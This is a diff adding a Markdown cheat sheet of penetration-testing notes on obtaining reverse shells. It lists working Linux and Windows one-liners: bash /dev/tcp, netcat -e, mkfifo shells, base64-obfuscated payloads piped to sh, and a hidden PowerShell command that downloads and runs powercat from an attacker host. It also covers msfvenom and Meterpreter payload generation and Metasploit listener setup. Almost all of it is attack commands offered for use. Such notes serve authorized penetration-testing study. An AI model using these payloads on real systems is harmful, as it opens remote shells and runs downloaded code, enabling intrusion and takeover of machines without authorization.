@@ -1,0 +1,61 @@
+### Get Reverse Shell
+- Best resource for reverse shell payloads → [Reverse shell cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- Best Reverse webshell code → `/usr/share/webshells` (asp,aspx,cfm,jsp,laudanum,perl,php)
+- Reverse Shell Generator → [Link](https://www.revshells.com/)
+- Some favourite reverse shell payload
+	- `Kali> nc -nlvp 4444` → Start Listener on Attacker’s machine
+    - **Linux**
+	    - Confirm connectivity to Attacker’s machine
+	        - Confirm by → Ping
+	            - `Kali> sudo tcpdump -i tun0 icmp`
+                - `Target> ping -c 10 <IP>` → If success then connecting
+            - Confirm by → file transfer
+	            - `Kali> python -m http.server 80`
+                - `Target> wget <IP>/<file-name>` → If success then connecting
+        - Request for Reverse shell
+	        - `Target> /bin/bash -c "bash -i >& /dev/tcp/<Attacker-IP>/4444 0>&1"`
+            - `Target> nc -e /bin/bash <Attacker-IP> 4444`
+            - `Target> rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Attacker-IP> 4444 >/tmp/f` → OpenBSD
+            - `Target> rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc <Attacker-IP> 4444 >/tmp/f` → BusyBox
+            - Base64 encoding method
+	            - Base64 encode any payloads, let’s take → base64(`/bin/bash -c "bash -i >& /dev/tcp/<Attacker-IP>/4444 0>&1"`) gives us payload as - `L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzxBdHRhY2tlci1JUD4vNDQ0NCAwPiYxIg==`
+                - `Target> echo "L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzxBdHRhY2tlci1JUD4vNDQ0NCAwPiYxIg==" | base64 -d | sh`
+	                - OR
+                - `Target> echo "L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzxBdHRhY2tlci1JUD4vNDQ0NCAwPiYxIg==" | base64 -d | bash`
+            - MSFVenom Payload
+	            - Staged → `msfvenom -p linux/x64/shell/reverse_tcp LHOST=<Attacker-IP> LPORT=4444 -f elf > shell.elf`
+                - Stageless → `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<Attacker-IP> LPORT=4444 -f elf > shell.elf`
+                - Payload for python script → `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<Attacker-IP> LPORT=4444  EXITFUNC=thread -f python`
+        - If doesn’t work try to use
+	        - If simple payload doesn’t work, try different variations of payloads
+            - If those doesn’t work, try different language payloads
+            - If those doesn’t work, try encoded payloads
+            - If those doesn’t work, try to listen on different ports → 4444, 9000, 8080, 80, 443, ... (usually try open ports on target machine)
+            - If those doesn’t work, try msfvenom payload
+    - **Windows**
+	    - `cmd> nc.exe -e cmd.exe <Attacker-IP> 4444` or `cmd> nc.exe -e powershell.exe <Attacker-IP> 4444`
+        - Powercat
+			```
+			powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<Attacker-IP>/powercat.ps1'); powercat -c <Attacker-IP> -p 4444 -e powershell"
+			```
+            - `Base64` encode this payload with Character set as `UTF-16LE` with this tool - [Base64encoder](https://www.base64encode.org/)
+            - `powershell.exe -nop -w hidden -e <base64-encoded-payload>`
+        - MSFVenom Payload
+	        - Staged → `Kali> msfvenom -p windows/shell/reverse_tcp LHOST=<Attacker-IP> LPORT=4444 -f exe > msf_exploit.exe`
+            - Stageless → `Kali> msfvenom -p windows/shell_reverse_tcp LHOST=<Attacker-IP> LPORT=4444 -f exe > msf_exploit.exe`
+- **Meterpreter**
+	- Create MSFVenom Payload
+	    - **Linux**
+	        - Staged → `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Attacker-IP> LPORT=4444 -f elf > shell.elf`
+            - Stageless → `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<Attacker-IP> LPORT=4444 -f elf > shell.elf`
+            - Payload for python script → `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<Attacker-IP> LPORT=4444  EXITFUNC=thread -f python`
+        - **Windows**
+	        - Staged → `Kali> msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker-IP> LPORT=4444 -f exe > msf_exploit.exe`
+            - Stageless → `Kali> msfvenom -p windows/meterpreter_reverse_tcp LHOST=<Attacker-IP> LPORT=4444 -f exe > msf_exploit.exe`
+    - Start Listener
+	    - `Kali> msfconsole`
+        - `msf> use multi/handler`
+        - `msf> set lhost <Attacker-IP>`
+        - `msf> set lport 4444`
+        - `msf> set payload <used-payload>`
+        - `msf> run`
